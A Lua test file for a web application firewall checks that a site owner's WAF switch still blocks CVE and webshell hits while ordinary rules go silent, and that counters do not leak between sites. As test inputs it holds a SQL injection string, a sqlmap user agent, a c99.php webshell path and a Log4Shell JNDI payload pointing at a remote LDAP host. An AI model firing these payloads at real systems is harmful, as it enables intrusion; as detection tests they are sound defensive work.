-- A site owner's WAF switch keeps the CVE and webshell rules on.
-- Run via `make test-lua`.
--
-- A scoped (cPanel) token may switch the WAF off for its own site: a
-- whole-WAF host exclude. Since 2026-11-26 the daemon marks that entry
-- keep_critical, and the edge then runs the WAF and keeps only the hits of
-- cfm_waf.WAF_TENANT_KEPT_REASONS (named CVEs, webshells): an owner can stop
-- false positives on its site, not open it to a known exploit. The operator's
-- own whole-WAF exclude still switches everything off.
--
-- 1. cfm_waf_excl.skip_for: keep_critical -> critical_only; a plain whole-WAF
--    entry wins; an expired entry (expires_unix) matches nothing.
-- 2. cfm_waf.check with ctx.critical_only: ordinary rules record nothing (the
--    deferred 201 / 511 blocks included), the kept families still block.

_G.ngx = {
  now           = function() return 1000 end,
  time          = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}
package.path = "configs/lua/?.lua;" .. package.path
local wx  = require("cfm_waf_excl")
local waf = require("cfm_waf")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

-- ── 1. skip_for ───────────────────────────────────────────────────────────────
do
  local function skip(entries, host, uri)
    local hosts, paths = wx.rows_from_entries(entries)
    return wx.skip_for(hosts, paths, host, uri or "/")
  end
  local owner = { type = "host", value = "shop.gr", scope_hosts = { "shop.gr" }, keep_critical = true }

  local all, ids, crit = skip({ owner }, "shop.gr")
  check(all == false and ids == nil and crit == true, "owner switch: the WAF runs, critical only")
  all, ids, crit = skip({ owner }, "www.shop.gr")
  check(all == false and crit == true, "owner switch covers the www. alias")
  all, ids, crit = skip({ owner }, "other.gr")
  check(all == false and crit == false, "owner switch: another site is untouched")

  -- The operator's whole-WAF exclude still switches everything off.
  all, ids, crit = skip({ owner, { type = "host", value = "shop.gr" } }, "shop.gr")
  check(all == true and crit == false, "operator whole-WAF exclude wins over the owner switch")
  all, ids, crit = skip({ { type = "host", value = "shop.gr" }, owner }, "shop.gr")
  check(all == true and crit == false, "operator whole-WAF exclude wins, either order")
  all, ids, crit = skip({ { type = "host", value = "shop.gr", keep_critical = false } }, "shop.gr")
  check(all == true and crit == false, "keep_critical = false is a plain whole-WAF exclude")
  all, ids, crit = skip({ { type = "host", value = "shop.gr", keep_critical = "true" } }, "shop.gr")
  check(all == true and crit == false, "only a boolean true is keep_critical")

  -- With a rule exclude next to it, both are reported.
  all, ids, crit = skip({ owner, { type = "path", value = "/api/", scope_hosts = { "shop.gr" }, rule_ids = { 402 } } }, "shop.gr", "/api/x")
  check(all == false and crit == true and ids and ids[402] == true, "owner switch + a rule exclude")

  -- Expiry: ngx.time() is 1000 here.
  local rule = { type = "path", value = "/api/", scope_hosts = { "shop.gr" }, rule_ids = { 402 } }
  rule.expires_unix = 2000
  all, ids = skip({ rule }, "shop.gr", "/api/x")
  check(ids and ids[402] == true, "an exclude that expires later applies")
  rule.expires_unix = 1000
  all, ids = skip({ rule }, "shop.gr", "/api/x")
  check(all == false and ids == nil, "an exclude at its expiry no longer applies")
  rule.expires_unix = 999
  all, ids = skip({ rule }, "shop.gr", "/api/x")
  check(all == false and ids == nil, "an expired exclude does not apply")
  rule.expires_unix = 0
  all, ids = skip({ rule }, "shop.gr", "/api/x")
  check(ids and ids[402] == true, "expires_unix = 0 means no expiry")
  all = skip({ { type = "host", value = "shop.gr", expires_unix = 999 } }, "shop.gr")
  check(all == false, "an expired whole-WAF exclude does not switch the WAF off")
  all, ids, crit = skip({ { type = "host", value = "shop.gr", keep_critical = true, expires_unix = 999 } }, "shop.gr")
  check(all == false and crit == false, "an expired owner switch is off")
end

-- ── 2. cfm_waf.check under critical_only ──────────────────────────────────────
do
  local function run(t, critical)
    local hit, reason, _, action, hits, rule_id = waf.check({
      critical_only = critical or nil,
      uri = t.uri or "/index.php", args = t.args or "",
      raw_uri = (t.uri or "/index.php") .. "?" .. (t.args or ""),
      method = t.method or "GET", ip = "203.0.113.5", body = t.body or "",
      headers = { ["user-agent"] = t.ua or "Mozilla/5.0", accept = "*/*", ["content-type"] = t.ct },
    })
    return { hit = hit, reason = tostring(reason), action = action, rule_id = rule_id, n = #(hits or {}) }
  end
  local function show(r) return r.reason .. "/" .. tostring(r.action) .. " id=" .. tostring(r.rule_id) .. " hits=" .. r.n end

  local sqli   = { args = "id=1%27%20UNION%20SELECT%201,2,3--%20-" }
  local sqlmap = { ua = "sqlmap/1.8.2#stable (https://sqlmap.org)" }
  local shell  = { uri = "/wp-content/uploads/c99.php" }
  local log4j  = { args = "q=${jndi:ldap://198.51.100.9/a}" }

  -- The rules are armed as shipped: each of these is a hit with the WAF on.
  local r = run(sqli);   check(r.hit and r.action == "block", "WAF on: SQLi blocks (" .. show(r) .. ")")
  r = run(sqlmap);       check(r.hit and r.rule_id == 201, "WAF on: sqlmap is rule 201 (" .. show(r) .. ")")
  r = run(shell);        check(r.hit and r.reason:find("^WAF_WEBSHELL") and r.action == "block", "WAF on: c99.php blocks (" .. show(r) .. ")")
  -- (With the WAF on, the same request also trips an RCE block, which owns the headline.)
  r = run(log4j);        check(r.hit, "WAF on: log4shell is a hit (" .. show(r) .. ")")

  -- Switched off by the owner: ordinary rules record nothing at all.
  r = run(sqli, true);   check(not r.hit and r.n == 0, "owner switch: SQLi records nothing (" .. show(r) .. ")")
  r = run(sqlmap, true); check(not r.hit and r.n == 0, "owner switch: the deferred 201 block is dropped (" .. show(r) .. ")")
  r = run({ ua = sqlmap.ua, args = sqli.args }, true)
  check(not r.hit and r.n == 0, "owner switch: sqlmap + SQLi records nothing (" .. show(r) .. ")")
  -- The kept families are untouched.
  r = run(shell, true)
  check(r.hit and r.reason == "WAF_WEBSHELL:PATH:c99.php" and r.action == "block" and r.rule_id == 413,
        "owner switch: the webshell rule still blocks (" .. show(r) .. ")")
  r = run(log4j, true)
  check(r.hit and r.reason:find("^WAF_CVE") and r.rule_id == 328 and r.n == 1, "owner switch: the CVE rule still fires, alone (" .. show(r) .. ")")
  -- A kept hit is the headline even with an ordinary payload on the same request.
  r = run({ uri = shell.uri, args = sqli.args, ua = sqlmap.ua }, true)
  check(r.hit and r.reason:find("^WAF_WEBSHELL") and r.n == 1, "owner switch: only the kept hit is recorded (" .. show(r) .. ")")
end

-- ── 2b. the counting rules do not count on a switched-off site ───────────────
-- Their counters are per client, not per site: counted on the switched-off
-- site, the client's first XML-RPC call or login on ANOTHER site was blocked
-- or challenged for requests this site had dropped.
do
  local store = {}
  local sh = {}
  function sh:incr(k, n) if store[k] == nil then return nil, "not found" end store[k] = store[k] + n; return store[k] end
  function sh:add(k, v) if store[k] ~= nil then return false, "exists" end store[k] = v; return true end
  function sh:get(k) return store[k] end
  function sh:set(k, v) store[k] = v; return true end
  local function run(host, critical, t)
    local hit, reason = waf.check({
      critical_only = critical or nil, host = host, shdict = sh, peer = t.peer,
      uri = t.uri, args = "", raw_uri = t.uri, method = "POST", ip = "203.0.113.5", body = t.body,
      headers = { ["user-agent"] = "Mozilla/5.0", accept = "*/*", ["content-type"] = t.ct, host = host } })
    return hit, tostring(reason)
  end
  local xml = { uri = "/xmlrpc.php", ct = "text/xml",
    body = "<?xml version='1.0'?><methodCall><methodName>wp.getPosts</methodName><params></params></methodCall>" }
  local login = { uri = "/wp-login.php", ct = "application/x-www-form-urlencoded",
    body = "log=admin&pwd=secret&wp-submit=Log+In", peer = "198.51.100.1" }
  for name, req in pairs({ xmlrpc = xml, login = login }) do
    -- The rule is live: enough of these with the WAF on is a hit.
    store = {}
    local fired = false
    for _ = 1, 40 do if run("on.gr", nil, req) then fired = true; break end end
    check(fired, name .. ": the counting rule fires with the WAF on (the test would prove nothing otherwise)")
    -- Switched off: nothing is counted, so nothing is stored and the next site starts clean.
    store = {}
    for _ = 1, 40 do
      local hit, reason = run("off.gr", true, req)
      check(not hit, name .. ": a hit on the switched-off site (" .. reason .. ")")
    end
    check(next(store) == nil, name .. ": the switched-off site moved a counter")
    local hit, reason = run("victim.gr", nil, req)
    check(not hit, name .. ": the client's first request on another site is a hit (" .. reason .. ")")
  end
end

-- ── 3. the family list ────────────────────────────────────────────────────────
do
  check(waf.is_tenant_kept_reason("WAF_CVE:CVE_2026_1:X:Y") and waf.is_tenant_kept_reason("WAF_WEBSHELL:PATH:c99.php"), "kept: CVE, WEBSHELL")
  check(not waf.is_tenant_kept_reason("WAF_SQLI:UNION") and not waf.is_tenant_kept_reason("WAF_PHP_WEBSHELL_BODY:X")
        and not waf.is_tenant_kept_reason("") and not waf.is_tenant_kept_reason(nil), "not kept: the rest")
  -- Every kept family is also a high-risk one (it blocks under clearance too).
  for fam in pairs(waf.WAF_TENANT_KEPT_REASONS) do
    check(waf.WAF_HIGH_RISK_REASONS[fam] == true, fam .. " is kept for tenants but not high-risk")
  end
end

if fails > 0 then
  io.stderr:write(("cfm_waf_tenant_switch_test: %d failure(s)\n"):format(fails))
  os.exit(1)
end
print("cfm_waf_tenant_switch_test: ok")
